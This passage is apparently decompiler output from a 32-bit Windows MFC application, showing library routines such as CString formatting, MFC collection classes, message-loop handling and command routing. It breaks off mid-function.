//----- (00414D12) --------------------------------------------------------
int sub_414D12()
{
  nullsub_9();
  return atexit(sub_414D29);
}
// 414D1C: using guessed type int nullsub_9(void);

//----- (00414D29) --------------------------------------------------------
void __cdecl sub_414D29()
{
  std::locale::~locale((std::locale *)&unk_444C24);
}

//----- (00414D5D) --------------------------------------------------------
int sub_414D5D()
{
  return atexit(nullsub_3);
}

//----- (00414D9F) --------------------------------------------------------
int sub_414D9F()
{
  return atexit(nullsub_3);
}

//----- (00414DE1) --------------------------------------------------------
int sub_414DE1()
{
  return atexit(nullsub_3);
}

//----- (00414EBA) --------------------------------------------------------
void __cdecl sub_414EBA()
{
  AfxTermLocalData(0, 1);
  sub_41C36E();
  AfxTlsRelease();
}

//----- (00414ED2) --------------------------------------------------------
int sub_414ED2()
{
  int result; // eax

  AfxInitialize(0, 0x600u);
  result = atexit(sub_414EBA);
  byte_444CC4 = result;
  return result;
}
// 444CC4: using guessed type char byte_444CC4;

//----- (00414EF0) --------------------------------------------------------
CString *__thiscall sub_414EF0(LPCSTR *this, CString *a2, void *Size)
{
  signed int v3; // eax

  v3 = (signed int)Size;
  if ( (int)Size < 0 )
    v3 = 0;
  if ( v3 < *((_DWORD *)*this - 2) )
  {
    Size = off_42667C;
    sub_416948(this, &Size, v3, 0, 0);
    sub_416693(a2, (LPCSTR *)&Size);
    sub_41691E(&Size);
  }
  else
  {
    sub_416693(a2, this);
  }
  return a2;
}
// 42667C: using guessed type void *off_42667C;

//----- (00414F68) --------------------------------------------------------
CString *__thiscall sub_414F68(const unsigned __int8 **this, CString *a2, unsigned __int8 *Control)
{
  void *v4; // eax

  v4 = (void *)_mbscspn(*this, Control);
  sub_414EF0((LPCSTR *)this, a2, v4);
  return a2;
}

//----- (00414F93) --------------------------------------------------------
void __thiscall sub_414F93(CString *this, char *Format, va_list a3)
{
  unsigned __int8 *v3; // edi
  unsigned __int8 v4; // al
  int v5; // esi
  int v6; // ebx
  unsigned __int8 *v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  void *v27; // esp
  size_t v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  size_t v33; // eax
  CString *v34; // esi
  char v35[12]; // [esp+8h] [ebp-20h] BYREF
  va_list ArgList; // [esp+14h] [ebp-14h]
  CString *v37; // [esp+18h] [ebp-10h]
  int v38; // [esp+1Ch] [ebp-Ch]
  int v39; // [esp+20h] [ebp-8h]
  int v40; // [esp+24h] [ebp-4h]

  v39 = 0;
  v3 = (unsigned __int8 *)Format;
  v37 = this;
  ArgList = a3;
  while ( *v3 )
  {
    if ( *v3 != 37 || (v3 = _mbsinc(v3), v4 = *v3, *v3 == 37) )
    {
      v33 = _mbclen(v3);
      v39 += v33;
      goto LABEL_92;
    }
    v5 = 0;
    v40 = 0;
    if ( !v4 )
    {
LABEL_16:
      v40 = atoi((const char *)v3);
      while ( *v3 && _ismbcdigit((char)*v3) )
        v3 = _mbsinc(v3);
      goto LABEL_20;
    }
    while ( v4 == 35 )
    {
      v39 += 2;
LABEL_14:
      v3 = _mbsinc(v3);
      v4 = *v3;
      if ( !*v3 )
        goto LABEL_15;
    }
    if ( v4 == 42 )
    {
      a3 += 4;
      v40 = *((_DWORD *)a3 - 1);
      goto LABEL_14;
    }
    if ( v4 == 45 || v4 == 43 || v4 == 48 || v4 == 32 )
      goto LABEL_14;
LABEL_15:
    if ( !v40 )
      goto LABEL_16;
LABEL_20:
    v6 = 0;
    if ( *v3 == 46 )
    {
      v7 = _mbsinc(v3);
      v3 = v7;
      if ( *v7 == 42 )
      {
        a3 += 4;
        v6 = *((_DWORD *)a3 - 1);
        v3 = _mbsinc(v7);
      }
      else
      {
        v6 = atoi((const char *)v7);
        while ( *v3 && _ismbcdigit((char)*v3) )
          v3 = _mbsinc(v3);
      }
    }
    v38 = 0;
    if ( !_mbsnbcmp(v3, "I64", 3u) )
    {
      v3 += 3;
      v38 = 0x40000;
      goto LABEL_37;
    }
    switch ( *v3 )
    {
      case 'F':
      case 'L':
      case 'N':
        goto LABEL_36;
      case 'h':
        v38 = 0x10000;
LABEL_36:
        v3 = _mbsinc(v3);
        break;
      case 'l':
        v38 = 0x20000;
        goto LABEL_36;
    }
LABEL_37:
    v8 = v38 | (char)*v3;
    if ( v8 > 65635 )
    {
      v20 = v8 - 65651;
      if ( !v20 )
        goto LABEL_62;
      v21 = v20 - 65488;
      if ( !v21 )
        goto LABEL_61;
      v22 = v21 - 16;
      if ( !v22 )
      {
LABEL_59:
        a3 += 4;
        if ( !*((_DWORD *)a3 - 1) )
          goto LABEL_63;
        v24 = wcslen(*((const wchar_t **)a3 - 1));
        goto LABEL_65;
      }
      v23 = v22 - 16;
      if ( !v23 )
      {
LABEL_61:
        a3 += 4;
        v5 = 2;
        goto LABEL_68;
      }
      if ( v23 == 16 )
        goto LABEL_59;
LABEL_45:
      v14 = (char)*v3;
      if ( v14 > 105 )
      {
        v29 = v14 - 110;
        if ( !v29 )
        {
          a3 += 4;
          goto LABEL_90;
        }
        v30 = v29 - 1;
        if ( !v30 )
          goto LABEL_87;
        v31 = v30 - 1;
        if ( v31 )
        {
          v32 = v31 - 5;
          if ( v32 && v32 != 3 )
            goto LABEL_90;
          goto LABEL_87;
        }
      }
      else
      {
        if ( v14 != 105 )
        {
          v15 = v14 - 71;
          if ( !v15 )
            goto LABEL_76;
          v16 = v15 - 17;
          if ( v16 )
          {
            v17 = v16 - 12;
            if ( v17 )
            {
              v18 = v17 - 1;
              if ( !v18 )
                goto LABEL_76;
              v19 = v18 - 1;
              if ( v19 )
              {
                if ( v19 != 1 )
                  goto LABEL_90;
LABEL_76:
                a3 += 8;
                v5 = 128;
LABEL_85:
                v28 = v6 + v40;
                if ( v6 + v40 < v5 )
                  goto LABEL_90;
              }
              else
              {
                v25 = v6 + 318;
                if ( v40 > v6 + 318 )
                  v25 = v40;
                v26 = v25 + 3;
                LOBYTE(v26) = v26 & 0xFC;
                v27 = alloca(v26);
                a3 += 8;
                sprintf(v35, "%*.*f", v40, v6 + 6, *((double *)a3 - 1));
                v28 = strlen(v35);
              }
              v5 = v28;
              goto LABEL_90;
            }
          }
        }
LABEL_87:
        if ( (v38 & 0x40000) != 0 )
        {
          a3 += 8;
          goto LABEL_84;
        }
      }
      a3 += 4;
LABEL_84:
      v5 = 32;
      goto LABEL_85;
    }
    if ( v8 == 65635 )
      goto LABEL_61;
    v9 = v8 - 67;
    if ( !v9 )
      goto LABEL_61;
    v10 = v9 - 16;
    if ( !v10 )
      goto LABEL_59;
    v11 = v10 - 16;
    if ( !v11 )
      goto LABEL_61;
    v12 = v11 - 16;
    if ( !v12 )
      goto LABEL_62;
    v13 = v12 - 65488;
    if ( !v13 )
      goto LABEL_61;
    if ( v13 != 16 )
      goto LABEL_45;
LABEL_62:
    a3 += 4;
    if ( !*((_DWORD *)a3 - 1) )
    {
LABEL_63:
      v5 = 6;
      goto LABEL_68;
    }
    v24 = lstrlenA(*((LPCSTR *)a3 - 1));
LABEL_65:
    v5 = v24;
    if ( v24 < 1 )
      v5 = 1;
    if ( !v5 )
      goto LABEL_45;
LABEL_68:
    if ( v6 && v5 >= v6 )
      v5 = v6;
    if ( v5 <= v40 )
      v5 = v40;
LABEL_90:
    v39 += v5;
LABEL_92:
    v3 = _mbsinc(v3);
  }
  v34 = v37;
  sub_416B9F(v37, v39);
  vsprintf(*(char *const *)v34, Format, ArgList);
  CString::ReleaseBuffer(v34, -1);
}

//----- (004152E0) --------------------------------------------------------
void __cdecl sub_4152E0(CString *a1, char *Format, int a3)
{
  sub_414F93(a1, Format, (va_list)&a3);
}

//----- (0041535F) --------------------------------------------------------
void __stdcall __noreturn sub_41535F(int a1)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = &unk_442B10;
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI5PAVCMemoryException__);
}

//----- (004153DC) --------------------------------------------------------
_DWORD *__thiscall sub_4153DC(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &CStringArray::`vftable';
  this[1] = 0;
  this[4] = 0;
  this[3] = 0;
  this[2] = 0;
  return result;
}
// 41F79C: using guessed type void *CStringArray::`vftable';

//----- (004153F3) --------------------------------------------------------
CStringArray *__thiscall sub_4153F3(CStringArray *lpMem, char a2)
{
  CStringArray::~CStringArray(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (004155B8) --------------------------------------------------------
int __thiscall sub_4155B8(CStringArray *this, int a2, LPCSTR lpString)
{
  if ( a2 >= *((_DWORD *)this + 2) )
    CStringArray::SetSize(this, a2 + 1, -1);
  return CString::operator=((CString *)(*((_DWORD *)this + 1) + 4 * a2), lpString);
}

//----- (0041564D) --------------------------------------------------------
_DWORD *__thiscall sub_41564D(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  this[3] = 0;
  this[4] = 0;
  this[2] = 0;
  this[1] = 0;
  this[5] = 0;
  *this = &CPtrList::`vftable';
  this[6] = a2;
  return result;
}
// 41FF70: using guessed type void *CPtrList::`vftable';

//----- (00415670) --------------------------------------------------------
_DWORD *__thiscall sub_415670(_DWORD *lpMem, char a2)
{
  sub_4156AC(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (004156AC) --------------------------------------------------------
int __thiscall sub_4156AC(_DWORD *this)
{
  *this = &CPtrList::`vftable';
  return sub_41568C(this);
}
// 41568C: using guessed type int __cdecl sub_41568C(_DWORD);
// 41FF70: using guessed type void *CPtrList::`vftable';

//----- (004156D5) --------------------------------------------------------
#error "4156E6: call analysis failed (funcsize=8)"

//----- (004156EE) --------------------------------------------------------
int __thiscall sub_4156EE(_DWORD *this)
{
  int *v1; // eax
  int v2; // edx
  int v3; // esi
  bool v4; // zf

  v1 = (int *)this[1];
  v2 = *v1;
  v3 = v1[2];
  v4 = *v1 == 0;
  this[1] = *v1;
  if ( v4 )
    this[2] = 0;
  else
    *(_DWORD *)(v2 + 4) = 0;
  sub_4156D5(v1);
  return v3;
}
// 4156D5: using guessed type _DWORD __stdcall sub_4156D5(_DWORD);

//----- (00415748) --------------------------------------------------------
_DWORD *__thiscall sub_415748(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  *this = &CMapPtrToPtr::`vftable';
  this[2] = 17;
  this[6] = a2;
  return result;
}
// 41FF3C: using guessed type void *CMapPtrToPtr::`vftable';

//----- (0041576F) --------------------------------------------------------
_DWORD *__thiscall sub_41576F(_DWORD *lpMem, char a2)
{
  sub_4157FB(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0041578B) --------------------------------------------------------
void __thiscall sub_41578B(int this, int a2, int a3)
{
  void *v4; // eax

  if ( *(_DWORD *)(this + 4) )
  {
    sub_416688(*(LPVOID *)(this + 4));
    *(_DWORD *)(this + 4) = 0;
  }
  if ( a3 )
  {
    v4 = sub_41665F(4 * a2);
    *(_DWORD *)(this + 4) = v4;
    memset(v4, 0, 4 * a2);
  }
  *(_DWORD *)(this + 8) = a2;
}

//----- (004157FB) --------------------------------------------------------
int __thiscall sub_4157FB(_DWORD *this)
{
  *this = &CMapPtrToPtr::`vftable';
  return sub_4157D0(this);
}
// 4157D0: using guessed type int __cdecl sub_4157D0(_DWORD);
// 41FF3C: using guessed type void *CMapPtrToPtr::`vftable';

//----- (00415824) --------------------------------------------------------
int *__thiscall sub_415824(int this)
{
  struct CPlex *v2; // eax
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // ecx
  int *result; // eax
  int v9; // ecx

  if ( !*(_DWORD *)(this + 16) )
  {
    v2 = CPlex::Create((struct CPlex **)(this + 20), *(_DWORD *)(this + 24), 0xCu);
    v3 = *(_DWORD *)(this + 24);
    v4 = 3 * v3;
    v5 = v3 - 1;
    v6 = (_DWORD *)((char *)v2 + 4 * v4 - 8);
    if ( v5 >= 0 )
    {
      v7 = v5 + 1;
      do
      {
        *v6 = *(_DWORD *)(this + 16);
        *(_DWORD *)(this + 16) = v6;
        v6 -= 3;
        --v7;
      }
      while ( v7 );
    }
  }
  result = *(int **)(this + 16);
  v9 = *result;
  ++*(_DWORD *)(this + 12);
  *(_DWORD *)(this + 16) = v9;
  result[1] = 0;
  result[2] = 0;
  return result;
}

//----- (00415871) --------------------------------------------------------
#error "415882: call analysis failed (funcsize=8)"

//----- (004158EF) --------------------------------------------------------
int *__thiscall sub_4158EF(_DWORD *this, int a2)
{
  int v2; // edi
  int *v4; // eax

  v2 = a2;
  v4 = (int *)sub_41588A(a2, &a2);
  if ( !v4 )
  {
    if ( !this[1] )
      sub_41578B((int)this, this[2], 1);
    v4 = sub_415824((int)this);
    v4[1] = v2;
    *v4 = *(_DWORD *)(this[1] + 4 * a2);
    *(_DWORD *)(this[1] + 4 * a2) = v4;
  }
  return v4 + 2;
}
// 41588A: using guessed type _DWORD __stdcall sub_41588A(_DWORD, _DWORD);

//----- (0041593F) --------------------------------------------------------
int __thiscall sub_41593F(_DWORD *this, unsigned int a2)
{
  int v2; // esi
  int v3; // edx
  _DWORD *v4; // eax
  _DWORD *v5; // edx

  v2 = this[1];
  if ( v2 )
  {
    v3 = (a2 >> 4) % this[2];
    v4 = *(_DWORD **)(v2 + 4 * v3);
    v5 = (_DWORD *)(v2 + 4 * v3);
    while ( v4 )
    {
      if ( v4[1] == a2 )
      {
        *v5 = *v4;
        sub_415871(v4);
        return 1;
      }
      v5 = v4;
      v4 = (_DWORD *)*v4;
    }
  }
  return 0;
}
// 415871: using guessed type _DWORD __stdcall sub_415871(_DWORD);

//----- (00415981) --------------------------------------------------------
int __thiscall sub_415981(_DWORD *this, _DWORD **a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // esi
  unsigned int v5; // edx
  unsigned int v6; // edi
  _DWORD **v7; // eax
  _DWORD *v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // edx
  _DWORD *v11; // eax
  int result; // eax

  v4 = *a2;
  if ( *a2 == (_DWORD *)-1 )
  {
    v5 = this[2];
    v6 = 0;
    if ( v5 )
    {
      v7 = (_DWORD **)this[1];
      do
      {
        v4 = *v7;
        if ( *v7 )
          break;
        ++v6;
        ++v7;
      }
      while ( v6 < v5 );
    }
  }
  v8 = (_DWORD *)*v4;
  if ( !*v4 )
  {
    v9 = this[2];
    v10 = (v4[1] >> 4) % v9 + 1;
    if ( v10 < v9 )
    {
      v11 = (_DWORD *)(this[1] + 4 * v10);
      do
      {
        v8 = (_DWORD *)*v11;
        if ( *v11 )
          break;
        ++v10;
        ++v11;
      }
      while ( v10 < v9 );
    }
  }
  *a2 = v8;
  *a3 = v4[1];
  result = v4[2];
  *a4 = result;
  return result;
}

//----- (004159F3) --------------------------------------------------------
void **sub_4159F3()
{
  return &off_41F228;
}
// 41F228: using guessed type void *off_41F228;

//----- (00415A1B) --------------------------------------------------------
int __thiscall sub_415A1B(_DWORD *this, int a2, int a3)
{
  HWND *v4; // esi

  v4 = (HWND *)sub_409E01();
  this[33] = 0;
  PostMessageA(v4[7], 0x36Au, 0, 0);
  return (*((int (__thiscall **)(HWND *, int, int))*v4 + 27))(v4, a2, a3);
}

//----- (00415A52) --------------------------------------------------------
int __stdcall sub_415A52(CObject *a1, int a2)
{
  int v2; // ebx
  int v3; // edi

  if ( *(_DWORD *)(a2 + 4) == 1 || *(_DWORD *)(a2 + 4) == 15 )
    return unknown_libname_19(a1, a2);
  v2 = 0;
  v3 = 61704;
  if ( *(_DWORD *)(a2 + 4) == 273 )
  {
    if ( !*(_DWORD *)(a2 + 12) )
      v3 = 61705;
    v2 = 1;
  }
  if ( CObject::IsKindOf(a1, (const struct CRuntimeClass *)&off_41F820) )
  {
    (*(void (__thiscall **)(CObject *, int, int))(*(_DWORD *)a1 + 16))(a1, 4144, v3);
  }
  else if ( !CObject::IsKindOf(a1, (const struct CRuntimeClass *)&off_41F5A8) )
  {
    (*(void (__thiscall **)(CObject *, int, int))(*(_DWORD *)a1 + 16))(a1, 16, v3);
  }
  return v2;
}
// 415F25: using guessed type _DWORD __stdcall unknown_libname_19(_DWORD, _DWORD);
// 41F5A8: using guessed type char *off_41F5A8;
// 41F820: using guessed type char *off_41F820;

//----- (00415AC9) --------------------------------------------------------
BOOL __thiscall sub_415AC9(CWinThread *this, int a2)
{
  int v2; // edi
  int v4; // ecx
  int v5; // eax

  v2 = a2;
  if ( a2 > 0 )
  {
    if ( a2 == 1 )
      CWinThread::OnIdle(this, 1);
  }
  else
  {
    CWinThread::OnIdle(this, a2);
    v4 = *((_DWORD *)this + 32);
    a2 = 0;
    if ( v4 )
    {
      a2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 16))(v4);
      while ( a2 )
      {
        v5 = (*(int (__thiscall **)(_DWORD, int *))(**((_DWORD **)this + 32) + 20))(*((_DWORD *)this + 32), &a2);
        (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 136))(v5);
      }
    }
  }
  return v2 < 1;
}

//----- (00415C66) --------------------------------------------------------
int __thiscall sub_415C66(char *this)
{
  int v2; // edi
  int v3; // eax
  int v5; // [esp+10h] [ebp-4h]

  v2 = 1;
  v5 = 0;
LABEL_2:
  while ( v2 )
  {
    if ( PeekMessageA((LPMSG)(this + 48), 0, 0, 0, 0) )
      break;
    v3 = v5++;
    if ( !(*(int (__thiscall **)(char *, int))(*(_DWORD *)this + 96))(this, v3) )
      v2 = 0;
  }
  while ( (*(int (__thiscall **)(char *))(*(_DWORD *)this + 92))(this) )
  {
    if ( (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 100))(this, this + 48) )
    {
      v5 = 0;
      v2 = 1;
    }
    if ( !PeekMessageA((LPMSG)(this + 48), 0, 0, 0, 0) )
      goto LABEL_2;
  }
  return (*(int (__thiscall **)(char *))(*(_DWORD *)this + 104))(this);
}

//----- (00415CE5) --------------------------------------------------------
int __thiscall sub_415CE5(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  int v4; // esi

  v2 = a2[1];
  if ( v2 == 512 || v2 == 160 )
  {
    if ( this[23] == a2[5] && this[24] == a2[6] && v2 == this[25] )
      return 0;
    v4 = a2[6];
    this[23] = a2[5];
    this[24] = v4;
    this[25] = a2[1];
  }
  else if ( v2 == 15 || v2 == 280 )
  {
    return 0;
  }
  return 1;
}

//----- (00415D3E) --------------------------------------------------------
int __thiscall sub_415D3E(_DWORD *this)
{
  return this[14];
}

//----- (00415E4D) --------------------------------------------------------
int __thiscall sub_415E4D(void *this, _DWORD *a2)
{
  _DWORD *i; // esi
  unsigned int v3; // eax
  int j; // eax

  for ( i = (_DWORD *)(*(int (__fastcall **)(void *))(*(_DWORD *)this + 40))(this); i; i = (_DWORD *)*i )
  {
    v3 = a2[1];
    if ( v3 >= 0xC000 )
    {
      for ( j = unknown_libname_24(i[1], 49152, 0, 0); j; j = unknown_libname_24(j + 24, 49152, 0, 0) )
      {
        if ( **(_DWORD **)(j + 16) == a2[1] )
          goto LABEL_10;
      }
    }
    else
    {
      j = unknown_libname_24(i[1], v3, 0, 0);
      if ( j )
      {
LABEL_10:
        (*(void (__thiscall **)(void *, _DWORD, _DWORD))(j + 20))(this, a2[2], a2[3]);
        return 1;
      }
    }
  }
  return 0;
}
// 418120: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00415EC8) --------------------------------------------------------
int __thiscall sub_415EC8(void *this, HWND *a2)
{
  HWND v2; // eax
  struct CObject *v3; // esi
  struct CObject *v5; // eax

  if ( !*a2 && sub_415E4D(this, a2) )
    return 1;
  v2 = (HWND)sub_409E01();
  v3 = (struct CObject *)v2;
  if ( v2 )
    v2 = (HWND)*((_DWORD *)v2 + 7);
  if ( sub_418A56(v2, a2) )
    return 1;
  if ( !v3 )
    return 0;
  v5 = sub_4173F9(*a2);
  if ( sub_4188CC(v5) == v3 )
    return 0;
  return (*(int (__thiscall **)(struct CObject *, HWND *))(*(_DWORD *)v3 + 144))(v3, a2);
}

//----- (00415FED) --------------------------------------------------------
int __thiscall sub_415FED(_DWORD *this, int a2, struct tagMSG *a3)
{
  HWND *v3; // eax
  HWND *v4; // eax
  HWND *v5; // edi
  int v6; // eax
  UINT message; // ecx
  int v8; // eax
  int v9; // edi
  UINT v10; // eax
  struct CNoTrackObject *Data; // eax
  struct CNoTrackObject *v12; // ebx
  int v13; // esi
  char v15[28]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD *v16; // [esp+28h] [ebp-4h]

  v16 = this;
  if ( !a3 )
    return 0;
  if ( a2 )
  {
    if ( a2 != 2 )
      return 0;
    v3 = (HWND *)sub_4173F9(a3->hwnd);
    if ( v3 )
    {
      v4 = sub_4188F4(v3);
      v5 = v4;
      if ( v4 )
      {
        if ( CFrameWnd::IsTracking((CFrameWnd *)v4) )
        {
          if ( v5[20] )
          {
            v6 = sub_409E01();
            if ( v16[7] )
            {
              if ( (message = a3->message, message == 256) && a3->wParam == 13 || message == 514 )
              {
                SendMessageA(*(HWND *)(v6 + 28), 0x111u, 0xE146u, 0);
                return 1;
              }
            }
          }
        }
      }
    }
  }
  v8 = sub_409E01();
  v9 = v8;
  if ( (unsigned int)dword_4447C4 < 0x333 && v8 && IsHelpKey(a3) )
  {
    SendMessageA(*(HWND *)(v9 + 28), 0x111u, 0xE146u, 0);
    return 1;
  }
  if ( !a2 )
  {
    if ( v16[8] )
    {
      v10 = a3->message;
      if ( v10 >= 0x100 && v10 <= 0x108 )
      {
        Data = CThreadLocalObject::GetData(
                 (CThreadLocalObject *)&unk_442A6C,
                 CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
        v12 = Data;
        if ( !*((_DWORD *)Data + 47) )
        {
          *((_DWORD *)Data + 47) = 1;
          qmemcpy(v15, a3, sizeof(v15));
          v13 = (int)v16;
          if ( sub_416EA3(v16[8]) && (*(int (__thiscall **)(int, char *))(*(_DWORD *)v13 + 88))(v13, v15) )
          {
            *((_DWORD *)v12 + 47) = 0;
            return 1;
          }
          *((_DWORD *)v12 + 47) = 0;
        }
      }
    }
  }
  return 0;
}
// 4447C4: using guessed type int dword_4447C4;

//----- (00416152) --------------------------------------------------------
BOOL __thiscall sub_416152(char *this)
{
  const MSG *v2; // edi
  BOOL result; // eax

  v2 = (const MSG *)(this + 48);
  result = GetMessageA((LPMSG)(this + 48), 0, 0, 0);
  if ( result )
  {
    if ( *((_DWORD *)this + 13) != 874 && !(*(int (__thiscall **)(char *, const MSG *))(*(_DWORD *)this + 88))(this, v2) )
    {
      TranslateMessage(v2);
      DispatchMessageA(v2);
    }
    return 1;
  }
  return result;
}

//----- (00416192) --------------------------------------------------------
_DWORD *__thiscall sub_416192(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[1] = 1;
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  this[5] = 1;
  this[6] = 0;
  return result;
}

//----- (004161AC) --------------------------------------------------------
int __thiscall sub_4161AC(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = this[4];
  v2 = this + 4;
  if ( result )
    return (*(int (__thiscall **)(_DWORD *, _DWORD *))(result + 28))(v2, this);
  return result;
}

//----- (004161D7) --------------------------------------------------------
int __stdcall sub_4161D7(
        int a1,
        int a2,
        int a3,
        int (__thiscall *a4)(_DWORD, _DWORD),
        _DWORD *a5,
        unsigned int a6,
        _DWORD *a7)
{
  BOOL v7; // ebx
  _DWORD *v10; // esi

  v7 = 1;
  if ( !a7 )
  {
    if ( a6 <= 0x28 )
    {
      switch ( a6 )
      {
        case 0x28u:
          ((void (__thiscall *)(int, int, _DWORD, _DWORD))a4)(a1, a2, a5[1], *a5);
          return v7;
        case 2u:
          return a4(a1, a2);
        case 0xCu:
          ((void (__thiscall *)(int))a4)(a1);
          return v7;
        case 0xDu:
          a4(a1, a2);
          return v7;
        case 0x23u:
          return ((int (__thiscall *)(int))a4)(a1);
        case 0x26u:
          ((void (__thiscall *)(int, _DWORD, _DWORD))a4)(a1, a5[1], *a5);
          return v7;
        case 0x27u:
          return ((int (__thiscall *)(int, _DWORD, _DWORD))a4)(a1, a5[1], *a5);
      }
      return 0;
    }
    switch ( a6 )
    {
      case ')':
        return ((int (__thiscall *)(int, int, _DWORD, _DWORD))a4)(a1, a2, a5[1], *a5);
      case ',':
        v10 = a5;
        a4(a1, a5);
        break;
      case '-':
        v10 = a5;
        ((void (__thiscall *)(int, _DWORD *, int))a4)(a1, a5, a2);
        break;
      case '.':
        a4(a1, a5);
        return v7;
      case '/':
        return a4(a1, a5);
      default:
        return 0;
    }
    v7 = v10[7] == 0;
    v10[7] = 0;
    return v7;
  }
  *a7 = a1;
  a7[1] = a4;
  return v7;
}

//----- (004162DE) --------------------------------------------------------
int __thiscall sub_4162DE(void *this, int a2, unsigned int a3, _DWORD *Buf1, _DWORD *a5)
{
  struct AFX_MODULE_STATE *ModuleState; // eax
  _DWORD *v9; // edi
  int i; // esi
  int v11; // eax
  unsigned int v12; // ebx
  _DWORD *j; // esi
  int v14; // eax
  int v15; // [esp+18h] [ebp+Ch]
  void *Buf1a; // [esp+1Ch] [ebp+10h]

  if ( a3 == -2 )
  {
    ModuleState = AfxGetModuleState();
    return (*(int (__thiscall **)(_DWORD, void *, int, _DWORD *, _DWORD *))(**((_DWORD **)ModuleState + 1038) + 4))(
             *((_DWORD *)ModuleState + 1038),
             this,
             a2,
             Buf1,
             a5);
  }
  if ( a3 == -3 )
  {
    v15 = 0;
    Buf1a = (void *)Buf1[12];
    v9 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
LABEL_5:
    if ( v9 && !v15 )
    {
      for ( i = v9[1]; ; i += 12 )
      {
        v11 = *(_DWORD *)(i + 4);
        if ( !v11 || !*(_DWORD *)(i + 8) || v15 )
        {
          v9 = (_DWORD *)*v9;
          goto LABEL_5;
        }
        if ( a2 == v11 )
        {
          if ( Buf1a )
          {
            if ( *(_DWORD *)i && !memcmp(Buf1a, *(const void **)i, 0x10u) )
            {
LABEL_17:
              v15 = 1;
              Buf1[1] = *(_DWORD *)(i + 8);
              continue;
            }
          }
          else if ( !*(_DWORD *)i )
          {
            goto LABEL_17;
          }
        }
      }
    }
    return v15;
  }
  else
  {
    if ( a3 == -1 || (v12 = HIWORD(a3), a3 = (unsigned __int16)a3, !v12) )
      v12 = 273;
    for ( j = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 40))(this); j; j = (_DWORD *)*j )
    {
      v14 = unknown_libname_24(j[1], v12, a3, a2);
      if ( v14 )
        return sub_4161D7(
                 (int)this,
                 a2,
                 a3,
                 *(int (__thiscall **)(_DWORD, _DWORD))(v14 + 20),
                 Buf1,
                 *(_DWORD *)(v14 + 16),
                 a5);
    }
    return 0;
  }
}
// 418120: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004163ED) --------------------------------------------------------
int __stdcall sub_4163ED(int a1)
{
  return 1;
}

//----- (004163F3) --------------------------------------------------------
int __stdcall sub_4163F3(int a1)
{
  return 0;
}

//----- (00416400) --------------------------------------------------------
int sub_416400()
{
  struct AFX_MODULE_STATE *ModuleState; // eax

  ModuleState = AfxGetModuleState();
  return (*(int (__thiscall **)(_DWORD, int))(**((_DWORD **)ModuleState + 1) + 144))(*((_DWORD *)ModuleState + 1), 1);
}

//----- (00416415) --------------------------------------------------------
int sub_416415()
{
  struct AFX_MODULE_STATE *ModuleState; // eax

  ModuleState = AfxGetModuleState();
  return (*(int (__thiscall **)(_DWORD, int))(**((_DWORD **)ModuleState + 1) + 144))(*((_DWORD *)ModuleState + 1), -1);
}

//----- (0041642A) --------------------------------------------------------
void *sub_41642A()
{
  return &unk_41F440;
}

//----- (00416430) --------------------------------------------------------
void *sub_416430()
{
  return &unk_41F460;
}

//----- (00416436) --------------------------------------------------------
void *sub_416436()
{
  return &unk_41F490;
}

//----- (0041643C) --------------------------------------------------------
void *sub_41643C()
{
  return &unk_41F4C8;
}

//----- (00416442) --------------------------------------------------------
void __thiscall sub_416442(void *this)
{
  CTypeLibCache *v2; // eax

  sub_41C3BC(13);
  v2 = (CTypeLibCache *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  if ( v2 )
    CTypeLibCache::Unlock(v2);
  AfxUnlockGlobals(13);
  if ( this )
    (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 4))(this, 1);
}

//----- (00416474) --------------------------------------------------------
void *sub_416474()
{
  return &unk_41F4E0;
}

//----- (0041647A) --------------------------------------------------------
void *sub_41647A()
{
  return &unk_41F4F0;
}

//----- (004164A6) --------------------------------------------------------
int __thiscall sub_4164A6(int this, int a2)
{
  int result; // eax
  UINT v4; // ecx
  int v5; // edi
  HWND Parent; // eax
  struct CObject *v7; // eax
  HWND v8; // ecx
  HWND NextDlgTabItem; // eax
  struct CObject *v10; // eax

  result = *(_DWORD *)(this + 12);
  if ( result )
  {
    if ( *(_DWORD *)(this + 16) )
      return result;
    v4 = a2 != 0 ? 0 : 3;
    BYTE1(v4) |= 4u;
    result = EnableMenuItem(*(HMENU *)(result + 4), *(_DWORD *)(this + 8), v4);
  }
  else
  {
    if ( !a2 )
    {
      v5 = *(_DWORD *)(this + 20);
